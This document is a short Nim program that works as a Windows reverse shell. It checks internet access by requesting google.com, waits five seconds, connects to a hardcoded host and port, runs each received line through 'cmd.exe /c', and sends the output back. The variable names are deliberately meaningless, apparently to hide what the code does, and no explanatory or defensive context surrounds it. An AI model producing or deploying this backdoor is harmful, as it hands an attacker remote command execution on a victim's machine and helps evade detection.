import osproc, os
import winim, system
import net, httpclient

var
  inconvene_thy_impression = "127.0.0.1"
  response_of_said_defence_point = Port(8080)
  create_tunnel_where_locale = newSocket()
  parse_time_date = newHttpClient()
  systemos_locate_file_in_receivemode: Response = nil



systemos_locate_file_in_receivemode = parse_time_date.request("https://www.google.com", httpMethod = HttpGet)
if systemos_locate_file_in_receivemode.status == "200 OK":
  sleep(5000)
  try:
    create_tunnel_where_locale.connect(inconvene_thy_impression, response_of_said_defence_point)
    while true:
      let receive_thy_order = create_tunnel_where_locale.recvLine()
      if receive_thy_order == "exit":
        break
      let impression_of_the = execProcess("cmd.exe /c " & receive_thy_order)
      create_tunnel_where_locale.send(impression_of_the)
  except:
      raise
  finally:
      create_tunnel_where_locale.close
else:
  echo systemos_locate_file_in_receivemode.status

